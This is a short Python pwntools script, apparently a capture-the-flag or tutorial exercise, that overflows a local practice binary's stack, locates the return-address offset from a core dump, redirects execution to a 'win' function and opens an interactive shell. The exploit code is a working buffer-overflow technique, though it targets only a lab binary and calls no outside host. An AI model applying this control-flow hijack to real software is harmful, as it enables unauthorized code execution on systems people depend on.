#! /usr/bin/env python

# https://docs.pwntools.com/en/stable/elf/corefile.html

from pwn import *

target_name = './vuln.exe'
# Set up pwntools for the correct architecture
exe = context.binary = ELF(target_name)

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(128)

# Run the process once so that it crashes
process([target_name, payload]).wait()

# Get the core dump
core = Coredump('./core')

# Our cyclic pattern should have been used as the crashing address, make sure!
#assert pack(core.eip) in payload

offset = cyclic_find(core.eip)
print(offset)
# Cool! Now let's just replace that value with the address of 'win'
win_address = exe.symbols.win
print(win_address)

payload = fit({
    offset: win_address
})

# Get a shell!
io = process([target_name, payload])
io.sendline(b'id')
print(io.recvline())

# get interactive shell
io.interactive()
